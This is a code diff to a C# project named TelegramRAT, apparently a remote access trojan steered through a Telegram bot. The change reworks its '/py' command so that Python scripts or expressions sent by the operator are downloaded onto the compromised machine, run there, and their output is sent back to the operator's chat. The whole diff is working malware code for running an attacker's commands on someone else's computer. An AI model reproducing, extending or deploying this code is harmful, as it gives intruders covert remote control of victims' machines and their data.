@@ -1531,7 +1531,7 @@ namespace TelegramRAT
             CommandsList.Add(new BotCommand
             {
                 Command = "/py",
-                Description = "Execute python expression or file. To execute file send it and reply to it with command /py. Mind that all expressions and files execute in the same script scope. To clear scope /pyclearscope",
+                Description = "Execute python expression or file. To execute file attach it to message or send it and reply to it with command /py. Mind that all expressions and files execute in the same script scope. To clear scope /pyclearscope",
                 Example = "/py print('Hello World')",
                 Execute = (model, update) =>
                 {
@@ -1539,31 +1539,34 @@ namespace TelegramRAT
                     {
                         try
                         {
-                            if (update.Message.ReplyToMessage == null || update.Message.ReplyToMessage.Type != MessageType.Document)
+                            if (update.Message.Type == MessageType.Document)
                             {
-                                if (model.Args.Length < 1)
+                                if (!update.Message.Document.FileName.Contains(".py"))
                                 {
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Need an expression or file to execute", replyToMessageId: update.Message.MessageId);
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This is not a python script!", replyToMessageId: update.Message.MessageId);
                                     return;
                                 }
-                                MemoryStream pyOutput = new MemoryStream();
-                                var pyStream = new MemoryStream();
-                                pythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);
+                                MemoryStream outputStream = new MemoryStream();
+                                var scriptFileStream = System.IO.File.Create("UserScript.py");
+                                pythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);
 
-                                pythonEngine.Execute(model.RawArgs, pythonScope);
-                                pyStream.Position = 0;
+                                var file = Bot.GetFileAsync(update.Message.Document.FileId).Result;
+                                Bot.DownloadFileAsync(file.FilePath, scriptFileStream).Wait();
+                                scriptFileStream.Close();
 
-                                if (pyStream.Length > 0)
-                                {
-                                    string output = string.Join(string.Empty, new StreamReader(pyStream).ReadToEnd().Take(4096).ToArray());
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output:\n{output}", replyToMessageId: update.Message.MessageId);
-                                }
+                                pythonEngine.ExecuteFile("UserScript.py", pythonScope);
+
+                                outputStream.Position = 0;
+
+                                string outputText = string.Join(string.Empty, new StreamReader(outputStream).ReadToEnd().Take(4096));
+
+                                if (outputText.Length > 0)
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output: {outputText}", replyToMessageId: update.Message.MessageId);
                                 else
-                                {
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Executed!", replyToMessageId: update.Message.MessageId);
-                                }
-                                pyStream.Position = 0;
-                                pyStream.Close();
+                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed!", replyToMessageId: update.Message.MessageId);
+
+                                System.IO.File.Delete("UserScript.py");
+                                outputStream.Close();
                                 return;
                             }
                             if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Document)
@@ -1595,7 +1598,32 @@ namespace TelegramRAT
 
                                 System.IO.File.Delete("UserScript.py");
                                 outputStream.Close();
+                                return;
                             }
+
+
+                            if (model.Args.Length < 1)
+                            {
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Need an expression or file to execute", replyToMessageId: update.Message.MessageId);
+                                return;
+                            }
+                            MemoryStream pyOutput = new MemoryStream();
+                            var pyStream = new MemoryStream();
+                            pythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);
+
+                            pythonEngine.Execute(model.RawArgs, pythonScope);
+                            pyStream.Position = 0;
+
+                            if (pyStream.Length > 0)
+                            {
+                                string output = string.Join(string.Empty, new StreamReader(pyStream).ReadToEnd().Take(4096).ToArray());
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output:\n{output}", replyToMessageId: update.Message.MessageId);
+                            }
+                            else
+                            {
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Executed!", replyToMessageId: update.Message.MessageId);
+                            }
+                            pyStream.Close();
 
                         }
                         catch (Exception ex)
